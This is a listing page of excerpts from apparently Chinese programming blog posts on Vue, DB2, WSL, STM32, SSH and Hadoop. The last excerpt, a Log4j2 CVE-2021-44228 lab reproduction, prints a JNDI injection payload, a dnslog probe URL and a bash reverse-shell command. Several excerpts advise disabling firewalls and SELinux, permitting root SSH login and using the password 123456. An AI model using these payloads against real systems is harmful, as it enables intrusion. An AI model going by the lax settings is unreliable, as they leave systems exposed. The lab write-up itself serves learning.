&lt;router-link :to="`/detail/${good.id}`"&gt; &lt;img :src="good.defaultImg" /&gt; &lt;/router-link&gt; 2.设置详情页的api接口 在文件夹api下的接口统一管理中添加获得接口数据的函数reqDetailInfo，
需要传入产品的ID
// /api/item/{ skuId } export const reqDetailInfo = (skuId) =&gt;{ return requests({url:`/item/${skuId}`,method:'get'}) } 3.创建关于产品详情的仓库（vuex) 在文件夹store下
import { reqDetailInfo } from "@/api" const state = { detailList:{} } const mutations = { GETDETAILLIST(state,detailList){ state.detailList = detailList } } const actions = { async getDetailList({commit},skuid){ let result = await reqDetailInfo(skuid) if(result.code==200){ commit('GETDETAILLIST',result.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b964e69dc08c9aac7a2610acfefbdd7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7836b4aecd9b8e995b7b924e7366f1c4/" rel="bookmark">
			DB2在Linux下静默安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言1. 下载并上传db2压缩包到Linux2. 检测db2安装环境3. 安装db2数据库软件4. 配置db2数据库系统用户5. 创建数据库实例6. 配置TCP/IP通信服务7. 配置数据库8. 启动和关闭数据库实例9. 修改权限10 数据库客户端和工具链接11. 创建数据库多实例 前言 db2是IBM公司开发的一款重型数据库，和oracle数据库差不多，但就整体安装来看比Oracle安装要简单得多，本此安装db2的Linux环境是Redhat Enterprise Linux 8.6（没有安装图形化界面，所以全程安装都是敲命令，大多数程序员都喜欢的一种安装方式）,db2的版本是V10.5（当前最新的版本是V11）,下面就开始。
1. 下载并上传db2压缩包到Linux db2下载地址
执行tar -zxvf v10.5_linuxx64_expc.tar.gz解压
IBM官网下载需要注册IBM账号，但是现在即使注册了，再点击下载链接时会重定向跳转，然后就没有然后了，进入不了下载页面，所以在这里提供db2下载（百度网盘保存的），将下载好的压缩包上传到Linux，我习惯上传到/usr/local/src目录下（上传的目录可以根据自己的喜好存放在哪里，这里没有特殊要求）
2. 检测db2安装环境 cd /usr/loca/src/expc目录下，执行 ./db2prereqcheck命令检查db2安装环境
（1）修复找不到libpam.so* yum install pam-devel.i686 （2）修复libstdc++.so.5（我这里就不修复了，这个不修复对使用DB2没有影响） （3）禁用SELinux vim /etc/selinux/config文件，修改SELinux=disabled （4）关闭防火墙服务并关闭随开机启动 systemctl stop firewalld systemctl disable firewalld 做完以上操作最好执行下init 0(或是reboot)重启下Linux系统.	3. 安装db2数据库软件 cd /usr/local/src/expc目录下执行 ./db2_install 安装数据库程序 输入yes,回车 最后出现如下图所示表示db2安装成功 4. 配置db2数据库系统用户 groupadd db2adm1 groupadd db2fen1 useradd -d /home/db2inst1 -m db2inst1 -g db2adm1 chown -R db2inst1 /home/db2inst1/ useradd -d /home/db2fenc1 -m db2fenc1 -g db2fen1 chown -R db2fenc1 /home/db2fenc1/ passwd db2inst1 passwd db2fenc1 这里密码都设置成123456 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7836b4aecd9b8e995b7b924e7366f1c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e6cc953b8440c63d8a0b2514b3ca675/" rel="bookmark">
			WSL2安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言安装WSL2简单配置WSL2WSL2与Window交互 前言 适用于 Linux 的 Windows 子系统可让开发人员按原样运行 GNU/Linux 环境 - 包括大多数命令行工具、实用工具和应用程序 - 且不会产生传统虚拟机或双启动设置开销。
您可以：
在 Microsoft Store 中选择你偏好的 GNU/Linux 分发版。运行常用的命令行软件工具（例如 grep、sed、awk）或其他 ELF-64 二进制文件。运行 Bash shell 脚本和 GNU/Linux 命令行应用程序，包括：工具：vim、emacs、tmux语言：NodeJS、Javascript、Python、Ruby、C/C++、C# 与 F#、Rust、Go 等服务：SSHD、MySQL、Apache、lighttpd、MongoDB、PostgreSQL。使用自己的 GNU/Linux 分发包管理器安装其他软件。使用类似于 Unix 的命令行 shell 调用 Windows 应用程序。在 Windows 上调用 GNU/Linux 应用程序。运行直接集成到 Windows 桌面的 GNU/Linux 图形应用程序将 GPU 加速用于机器学习、数据科学场景等 WSL1 VS WSL2
引用资料：https://learn.microsoft.com/zh-cn/windows/wsl/about
安装WSL2 1.检测电脑win的版本
win+r在框中输入winver查看当前的版本
2.开发者选项
3.打开适用于linux的windows子系统的设置（注意：这里设置完成后需要重启一下电脑）
4.在cmd黑窗口下分别输入以下命令
wsl -l -v dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart dism.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e6cc953b8440c63d8a0b2514b3ca675/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ea010a7a4f358230ec26d153789259b/" rel="bookmark">
			Window10 安装Linux子系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为Window10 安装Linux子系统 WSL是win10 的Linux的子系统，相比虚拟机有更多的优势，对系统资源占用少，切换系统之间较为的方便。
安装步骤：
安装WSL要求Win10系统在1607版本以上，查看自己的版本是否符合要求
开启Linux子系统，控制面板&gt;程序和功能&gt;启用或关闭windows功能&gt;勾选 适用于linux子系统
重启电脑
打开应用商城搜索"WSL",根据自己需求选择linux系统安装
配置linux
移动WSL的家目录位置
忘记用户密码怎么办?
下面为详细步骤
1. 查看系统版本 image-20210401113039929
一般系统版本都会符合安装要求
2. 开启Linux子系统 image-20210401113316251
控制面板&gt;程序和功能&gt;启用或关闭windows功能&gt;勾选 适用于linux子系统
3. 重启电脑 勾选完确定后，系统会提示重启
4. 应用商城搜索"WSL",选择安装linux系统 image-20210401113605980
5. 配置linux 配置好看的终端
下载地址：https://github.com/felixse/FluentTerminal/releases
下载FluentTerminal.Package_0.7.5.0.zip,解压后，右键以powershell运行，根据提示安装
更换镜像源
镜像网址：https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/
# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ea010a7a4f358230ec26d153789259b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd2a8dd35fcbccc1c978d2280c4e2ab5/" rel="bookmark">
			拖拽插件—— sortableJs
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Sortable.js 是一款优秀的 js 拖拽库，支持ie9及以上版本ie浏览器和现代浏览器，也可以运行在移动触摸设备中。不依赖jQuery。支持 Meteor、AngularJS、React、Vue、Knockout框架和任何CSS库，如Bootstrap、Element UI。你可以用来拖拽div、table等元素。
Sortable.js 是基于 H5 的新特性 - 拖拽属性 来实现的。
sortable.js中文文档
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa33873d9718f3d12ca06794e59d9961/" rel="bookmark">
			使用VSCode取代Keil实现STM32和51单片机的开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 使用Visual Studio Code开发STM32和51单片机，VS Code作为编辑器来开发嵌入式程序。
视频教程：https://www.bilibili.com/video/BV18e4y1H7xX/
VS Code简介 Visual Studio Code是是由微软研发的一个轻量级但功能强大的源代码编辑器，这个软件是免费开源的，可在您的桌面上运行，并且可用于Windows，macOS和Linux。它具有对JavaScript，TypeScript和Node.js的内置支持，并具有丰富的其他语言（例如C ++，C＃，Java，Python，PHP，Go）和运行时（例如.NET和Unity）扩展的生态系统。
如果你不喜欢Dev的开发界面，或是Visual Studio启动工程的缓慢，那么你应该尝试使用VScode来编写C/C++程序。因为它足够高效简洁且高效。
作为一个51单片机或STM32单片机的使用者，keil一直是我们的必备的一款工具之一。但kei的一些问题也一直存在，被人吐槽最多的就是编辑器功能单一、提示功能不强、对中文支持不友好。当然，还有一些爱美的朋友，说它界面丑陋。而VS Code作为一款微软出品的、界面友好的编辑器，一直深受程序员的喜爱。现在我们可以通过安装插件的方式，在VS Code上进行51或者STM32的开发。方法如下。
软件安装 需要先安装好Keil和VS Code，怎么安装就不讲了，自己百度一下。
VS Code官网：https://url.zeruns.tech/6y6RD
Keil5下载地址：https://url.zeruns.tech/usV3e
修改语言为中文 打开vscode点击左边的这个扩展的图标（下图所示），搜索栏输入Chinese，安装第一个扩展插件，安装完后重启vscode就变成中文了。
安装扩展插件 首先安装C/C++ Extension Pack扩展。
安装Keil Assistant扩展。
安装完后点击扩展设置
添加keil的可执行文件的路径，这里有两个路径，上面是C51的，下面是MDK的，你要填自己keil安装的目录，参考下图。我将C51和MDK安装到一起了，所以两个填同一个地址就行，如果是分开安装的就需要分开填。
到这设置就完成了，下面演示一下怎么使用。
用VSCode开发 首先需要用keil或stm32cubemx来新建一个工程项目，并把编译和调试下载的相关设置设置好。
接着用vscode打开项目文件夹。
接着就可以用vscode来开发stm32了，下图所示的是编译和下载的按钮。
点击这个编译按钮，vscode就会调用keil来完成编译。
点击下载按钮，编译好的程序就会被下载到你的stm32单片机上。
51单片机同样也可以使用这种方式开发。
推荐阅读 高性价比和便宜的VPS/云服务器推荐: https://www.awsl9527.cn/archives/41.html使用NPS搭建内网穿透服务器，带Web面板：https://www.awsl9527.cn/archives/748.htmlLinux搭建网站教程，建站教程：https://www.awsl9527.cn/archives/1094.html我的世界服务器搭建教程：https://www.awsl9527.cn/archives/tag/minecraft基于STM32和HC-SR04模块实现超声波测距功能：https://blog.zeruns.tech/archives/680.htmlESP8266开发环境搭建及项目演示：https://blog.zeruns.tech/archives/526.html 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae23c8929d4b657dfb50973dc24ff323/" rel="bookmark">
			基于改进反电势模型的无感PMSM转子磁链定向控制仿真
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		模型推导，以隐极式电机为例：
u α = R s i s α + L 1 d i s α d t + p ψ ⃗ f cos ⁡ θ r u β = R s i s β + L 1 d i s β d t + p ψ ⃗ f sin ⁡ θ r u ⃗ α β = R s i ⃗ s α β + L 1 p i ⃗ α β + p ψ ⃗ f p ψ ⃗ f = u ⃗ α β − R s i ⃗ s α β − L 1 p i ⃗ α β ψ ⃗ f = ψ f e j ω e t p ψ ⃗ f = d ψ f d t e j ω e t + j ω e ψ f e j ω e t d ψ f d t e j ω e t + j ω e ψ f e j ω e t = u ⃗ α β − R s i ⃗ s α β − L 1 p i ⃗ α β d ψ f d t + j ω e ψ f = ( u ⃗ α β − R s i ⃗ s α β − L 1 p i ⃗ α β ) e − j ω e t u_{\alpha}=R_si_{s\alpha}+L_1\frac{di_{s\alpha}}{dt}+p\vec{\psi}_f\cos \theta _r \\ u_{\beta}=R_si_{s\beta}+L_1\frac{di_{s\beta}}{dt}+p\vec{\psi}_f\sin \theta _r \\ \vec{u}_{\alpha \beta}=R_s\vec{i}_{s\alpha \beta}+L_1p\vec{i}_{\alpha \beta}+p\vec{\psi}_f \\ p\vec{\psi}_f=\vec{u}_{\alpha \beta}-R_s\vec{i}_{s\alpha \beta}-L_1p\vec{i}_{\alpha \beta} \\ \vec{\psi}_f=\psi _fe^{j\omega _et} \\ p\vec{\psi}_f=\frac{d\psi _f}{dt}e^{j\omega _et}+j\omega _e\psi _fe^{j\omega _et} \\ \frac{d\psi _f}{dt}e^{j\omega _et}+j\omega _e\psi _fe^{j\omega _et}=\vec{u}_{\alpha \beta}-R_s\vec{i}_{s\alpha \beta}-L_1p\vec{i}_{\alpha \beta} \\ \frac{d\psi _f}{dt}+j\omega _e\psi _f=\left( \vec{u}_{\alpha \beta}-R_s\vec{i}_{s\alpha \beta}-L_1p\vec{i}_{\alpha \beta} \right) e^{-j\omega _et} uα​=Rs​isα​+L1​dtdisα​​+pψ ​f​cosθr​uβ​=Rs​isβ​+L1​dtdisβ​​+pψ ​f​sinθr​u αβ​=Rs​i sαβ​+L1​pi αβ​+pψ ​f​pψ ​f​=u αβ​−Rs​i sαβ​−L1​pi αβ​ψ ​f​=ψf​ejωe​tpψ ​f​=dtdψf​​ejωe​t+jωe​ψf​ejωe​tdtdψf​​ejωe​t+jωe​ψf​ejωe​t=u αβ​−Rs​i sαβ​−L1​pi αβ​dtdψf​​+jωe​ψf​=(u αβ​−Rs​i sαβ​−L1​pi αβ​)e−jωe​t搭建仿真模型：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae23c8929d4b657dfb50973dc24ff323/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bd42afe865e59379d6013b3feb4b458/" rel="bookmark">
			STM32 | CubeIDE 配置Include路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		01.CubeIDE创建工程的结构目录 这个Matrix文件夹是我写代码的,c于.h文件
这样子在Cubeide 生成代码的时候，不会影响到自己编写的原有代码结构。
在这个时候需要关联Include才能正确识别；
02.创建连接 点击工程选择Properties
点击C/C++ Build
点击Paths and Symbols
Include选项卡中添加 ADD，你要包含的文件夹
如在Workspace中则对应点击，如在系统文件中则对应点击FileSystem
然后添加Source Location
依然选择对应的路径，我这里选择的是在Core/matrix，这是我存放我的代码的路径
至此，头文件与自己的文件路径就配置完成了，在编译的时候也不会报错。
菜鸟上路，欢迎指正！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cddb07f9d460ced3886afcb038b55977/" rel="bookmark">
			CentOS 如何更改SSH端口的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本文将分享CentOS 如何更改SSH端口的方法。执行以下步骤以更改CentOS上的默认SSH端口号：
1、登录centos服务器；
2、输入vi /etc/ssh/sshd_config编辑此文件.
在原配置文件 Port 22这行回车添加新端口，然后按键盘的Esc退出编辑，再然后输入:wq保存并退出。添加一个新的端口最好把原来默认的22端口打开，等修改成功后再关闭22端口。
3、重启sshd 服务：systemctl restart sshd
4、查看sshd服务是否正常启动：systemctl status sshd
5、检查端口是否处于监听状态：netstat -ntulp | grep sshd
6、设置防火墙策略，可以直接将防火墙全关闭。
systemctl stop firewalld
systemctl disable firewalld
7、关闭SeLinux：vim /etc/selinux/config
8、重启生效，然后就可以用新端口登陆SSH，登陆后把22端口关闭。
由 主机教程网 2bcd.com 首发于 主机教程网
原文链接：https://2bcd.com/1887.html 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc94edb3213522889f2b037816b536c2/" rel="bookmark">
			VUE3集成Markdown编辑器（http://editor.md.ipandao.com/）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
背景信息
Editor.md是2015年开源的项目，那时还没有VUE3版本，所以网上也较少VUE3集成Editor.md的示例。不过还是有些大牛分享了集成的方法。
集成方法
1、下载和安装editor.md、scriptjs及 jquery.js
2、封装一个组件EditorMarkdown，以下为 EditorMarkdown.vue的内容。
3、引用组件EditorMarkdown，以下为App.vue的内容。
运行效果
父组件往子组件传递参数（场景：单击文档的导航节点时可往编辑器中传值），完成编辑器的初始化。
背景信息 Editor.md是2015年开源的项目，那时还没有VUE3版本，所以网上也较少VUE3集成Editor.md的示例。不过还是有些大牛分享了集成的方法。 例如： vue集成editor.md_流年ln的博客-CSDN博客_vue使用editor.mdk
可是不能直接使用，需要进行一些调整。经过不断尝试，调整成功。
集成方法 1、下载和安装editor.md、scriptjs及 jquery.js editor.md最新版本： v1.5.0，更新于 2015-06-09 Github下载
或者通过 NPM 安装：
npm install editor.md
将下载后的文件放置到VUE3项目的public/static目录下（VUE2是放置到与src并列的static目录中）。
放置好后的目录结构如下（EditorMarkdown.vue为下一步要创建的组件——集成了editor.md，且可获取Markdown内容和解析后的Html内容，可在任意页面中引用）。
安装scriptjs npm install scriptjs --save 下载jquery.js 从官网下载：Download jQuery | jQuery
建议下载非压缩版的，便于调试，例如Download the uncompressed, development jQuery 3.6.1 将jquery.js放置到：static/editor.md/lib/jquery.js（下文组件中会引用此路径）。 2、封装一个组件EditorMarkdown，以下为 EditorMarkdown.vue的内容。 &lt;template&gt; &lt;div&gt; &lt;link rel="stylesheet" href="/static/editor.md/css/editormd.css"&gt; &lt;!-- editormd --&gt; &lt;button id="get-md-btn"&gt;Get Markdown&lt;/button&gt; &lt;button id="get-html-btn"&gt;Get HTML&lt;/button&gt; &lt;div id="editor" style="z-index: 10" /&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import scriptjs from 'scriptjs' export default { name: 'EditorMarkdown', props: { modelValue: { type: String, required: false, default: '' }, height: { type: String, required: false, default: '720px' } }, data() { return { editor: {} } }, mounted() { // 设置延迟初始化markdown编辑器, 因为只会初始化一次，需要等待数据加载完成之后再初始化 setTimeout(() =&gt; { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc94edb3213522889f2b037816b536c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5de1a599002a1e48e7ce2a8875f64ec/" rel="bookmark">
			微信小程序 FileSystemManager.rmdir 安卓兼容性问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 经测试，微信小程序的 FileSystemManager.rmdir 递归删除在安卓部分机型上有兼容性问题，会既不触发 success 回调，也不触发 fail 回调。在苹果机型上没有出现此问题。
可以使用 readdir 和 unlink 方法，先获取文件列表，再对文件逐个进行删除，来实现删除文件夹内文件的目的。
参考代码：
const fs = wx.getFileSystemManager() const dirPath = `${wx.env.USER_DATA_PATH}/example` fs.readdir({ dirPath, success(list) { list.files.forEach((fName) =&gt; { const fPath = `${dirPath}/${fName}`; try { fs.unlinkSync(fPath); } catch (e) { console.error(e); } }); }, fail(e) { console.error(e); } }) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00eb8b39d6e6b7768f846b89c5ff4fca/" rel="bookmark">
			STM32cubeIDE安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.STM32cubeIDE的介绍
STM32CubeIDE是一种高级C/C++开发平台，具有STM32微控制器和微处理器的外设配置、代码生成、代码编译和调试功能。它基于Eclipse®/CDT™框架和用于开发的GCC工具链，以及用于调试的GDB。它支持集成数以百计的现有插件，正是这些插件使Eclipse® IDE的功能趋于完整。
STM32CubeIDE集成了STM32CubeMX的STM32配置与项目创建功能，以便提供一体化工具体验，并节省安装与开发时间。在通过所选板卡或示例选择一个空的STM32 MCU或MPU，或者预配置微控制器或微处理器之后，将创建项目并生成初始化代码。在开发过程的任何时间，用户均可返回外设或中间件的初始化和配置阶段，并重新生成初始化代码，期间不会影响用户代码。
STM32CubeIDE包含相关构建和堆栈分析仪，能够为用户提供有关项目状态和内存要求的有用信息。
STM32CubeIDE还具有标准和高级调试功能，其中包括CPU内核寄存器、存储器和外设寄存器以及实时变量查看、串行线传输监测器接口或故障分析器的视图。
2.STM32cubeIDE的下载
ST官网网址：https://www.st.com/zh/development-tools/stm32cubeide.html
2-1.进入官网，点击获取软件
注意：下载之前，需要注册ST官网账号
2-2.获取软件，下载
3.下载后得到安装包，以管理员身份运行
4.选择Next
5.选择 I Agree
6.选择安装路径，一般默认（如果磁盘空间小，建议安装其他盘），在点击Next
，
7.默认，点击Install
8.等待安装，安装好点击Next
9.点击Finish
10.双击打开，出现下面界面 11.选择自己开发板芯片型号，点击Next
12.为自己的工程起一个名字，注意不能有中文字符
13.选择Yes，等待下载其他文件
14.完成下载后，就有了下面的界面。接下来就是开发STM32之旅了！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78b39b989b61be572109ca1cf1b06302/" rel="bookmark">
			解决survIDINRI包比较两个cox模型的IDI/NRI值Error in Surv(xi, di)Time variable is not numeric错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决：Error in Surv(xi, di) : Time variable is not numeric
如果出现此报错，需要将模型所有自变量进行哑变量转换。survIDINRI文档中推荐的是用model.matrix函数进行哑变量化，注意使用该函数的话新的数据经过as.data.frame转换后会产生一列“Intercept”，需将此列删除。再进行模型运算。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fa06a4c4741010db541145e790985c9/" rel="bookmark">
			Flowable工作流引擎
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flowable工作流引擎 Flowable-基础篇(根据BV1Pb4y1p7Ku整理) 一、简介 Flowable是BPMN的一个基于java的软件实现，不过Flowable不仅仅包括BPMN，还有DMN决策表和CMMN Case管理引擎，并且有自己的用户管理、微服务API等一系列功能，是一个服务平台。
官方手册：https://tkjohn.github.io/flowable-userguide/# introduction 二、数据库解析（数据库为代码创建，先看第三点：实例前的示例（官方文档的例子）） 1、act_evt_log：日志表
2、act_ge_bytearray：二进制资源表
3、act_ge_bytearray：引擎属性表
4、act_hi_actinst：历史活动信息表
5、act_hi_attachment：流程历史附件表
6、act_hi_comment：历史审批意见表
7、act_hi_detail：历史详情表
8、act_hi_identitylink：历史参与的人员表
9、act_hi_procinst：历史流程记录表
10、act_hi_taskinst：历史任务表
11、act_hi_varinst：历史流程变量表
12、act_id_bytearray：用户组部署内容表
用户组的部署内容
13、act_id_group：所有用户组信息表
所有用户组的信息
14、act_id_info：所有用户信息表
所有用户的信息，账号密码
15、act_id_membership：用户和用户组关系表
用户和用户组的关系
16、act_id_priv：权限表
17、act_id_priv_mapping：用户权限关系表
18、act_id_property：用户变量表
用户的变量，存了版本号
19、act_id_token：用户访问记录表
20、ct_id_user：用户基本信息表
用户基本信息，包括邮箱等
21、act_procdef_info：流程定义信息表
22、act_re_deployment：流程部署表
23、act_re_model：流程模型表
24、act_re_procdef：流程定义表
25、act_ru_deadletter_job：运行时死信作业表
26、act_ru_event_subscr：运行时事件订阅表
27、act_ru_execution：运行时流程执行实例表
28、atc_ru_history_job：运行时历史信息表
29、act_ru_identitylink：运行时身份连接表
30、act_ru_job：运行时作业表
31、act_ru_suspended_job：运行时挂起的定时作业表
32、act_ru_task：运行时任务表
33、act_ru_timer_job：运行时定时作业表
34、act_ru_variable：运行时流程变量表
三、实例前的示例（官方文档的例子） 1、创建项目 ●创建一个maven项目
●填写pom依赖
2、配置依赖 &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.flowable&lt;/groupId&gt; &lt;artifactId&gt;flowable-engine&lt;/artifactId&gt; &lt;version&gt;6.3.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.21&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2fa06a4c4741010db541145e790985c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00ed04b7951f387620d177f162455c2d/" rel="bookmark">
			Linux SSH Access denied（拒绝访问）解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		虚拟机安装的ubuntu使用 SSH 连接出现 Access denied，记录一下这个坑。
详细问题如下（见图）：
解决方案
查了下资料，Linux 系统默认就是禁止远程登录的。那就打开权限就行了。
因为需要修改系统设置，普通用户会出现没有权限，所以在超级管理员下操作，输入 su root 在输入密码便可（如图）：
安装 openssh-server
yum -y install openssh-server 1
检查下 SSH 版本
ps -e |grep ssh
1
见下图：ssh-server 已经安装成功了。
编辑配置文件：
vim /etc/ssh/sshd_config
1
修改 PermitRootLogin 为 yes
退出编辑：
按下 'Esc' 键，输入" :wq " ，回车便可。
1
重启 SSH：
systemctl restart sshd
1
大功告成，可以使用ssh链接了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2450dee113de1b29e41945f86690642e/" rel="bookmark">
			第三节 Hadoop学习案例——MapReduce课程设计 好友推荐功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章内容主要以案例为主
目录
前言
项目说明
一，程序需求
1.需求
2.数据
二，编码操作
1.项目建包目录
2.FriendsRecommend.java
3.FriendsRecommendMapper.java
4.FriendsRecommendReduce.java
三，Xshell运行的步骤
1.创建目录
2.上传程序
3.分布式文件系统上传测试数据
4.执行程序
5. 查看结果
总结
前言 项目说明 互为推荐关系 非好友的两个人之间存在相同好友则互为推荐关系朋友圈两个非好友的人，存在共同好友人数越多，越值得推荐存在一个共同好友，值为1；存在多个值累加 提示：以下是本篇文章正文内容，下面案例可供参考
一，程序需求 1.需求 程序要求，给每个人推荐可能认识的人 互为推荐关系值越高，越值得推荐每个用户，推荐值越高的可能认识的人排在前面 2.数据 数据使用空格分割每行是一个用户以及其对应的好友每行的第一列名字是用户的名字，后面的是其对应的好友数据准备：friend.txt xiaoming laowang renhua linzhiling laowang xiaoming fengjie renhua xiaoming ligang fengjie linzhiling xiaoming ligang fengjie guomeimei ligang renhua fengjie linzhiling guomeimei fengjie linzhiling fengjie renhua laowang linzhiling guomeimei 二，编码操作 1.项目建包目录 2.FriendsRecommend.java package org.hadoop.mr; import org.apache.hadoop.conf.Configuration; import org.apache.hadoop.fs.Path; import org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2450dee113de1b29e41945f86690642e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eddfa78a11dd5b490ff78197b18b9b6a/" rel="bookmark">
			火狐浏览器跨域问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		火狐浏览器跨域问题 在地址栏录入前端地址后允许风险访问
这个时候前端可以访问了，但是登陆时调用的后端接口报错了
原因：后端访问地址未被允许造成的
解决：把后端访问地址在地址栏录入后允许风险访问，和前端的允许访问操作一致
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d821b91adcc41411c3466842d4fd93eb/" rel="bookmark">
			CVE-2021-44228 log4j2远程代码执行漏洞复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据（类似于${jndi:ldap://evil.com/example}的lookup用于进行JNDI注入），触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。
影响范围：2.0至2.14.1
漏洞前置知识 1、log4j2
Apache Log4j 2 是Java语言的日志处理套件，通过使用Log4j，可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等。
2、JNDI JNDI是Java Naming and Directory Interface（JAVA命名和目录接口）的英文简写，它是为JAVA应用程序提供命名和目录访问服务的API（Application Programing Interface，应用程序编程接口）。
JNDI目前所支持的技术包括LDAP、CORBA Common Object Service（COS）名字服务、RMI、NDS、DNS、Windows注册表等等。
3、LDAP
LDAP是一个目录服务，可以通过目录路径查询到对应目录下的对象（文件）等。即其也是JNDI的实现，通过名称（目录路径）查询到对象（目录下的文件）。
4、RMI
能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法
5、攻击原理
Log4j2默认支持解析ldap/rmi协议（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容，该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。
环境搭建 靶机：172.16.10.12
kali：172.16.10.60
这里使用vulhub-master docker环境来搭建
进入vulhub-master/log4j/CVE-2021-44228目录
执行docker-compose up -d
服务启动后，访问http://172.16.10.60:8983即可查看到后台页面
漏洞复现 第一步、判断是否存在漏洞
首先在dnslog平台拿到一个域名
用到管理的接口的action参数构造payload
http://172.16.10.12:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.lzuhd0.dnslog.cn} 访问之后，dnslog平台出现数据，显示出当前java版本，证明漏洞存在
第二步、反弹shell
首先构造反弹shell命令
bash -i &gt;&amp; /dev/tcp/172.16.10.60/3456 0&gt;&amp;1 进行编码
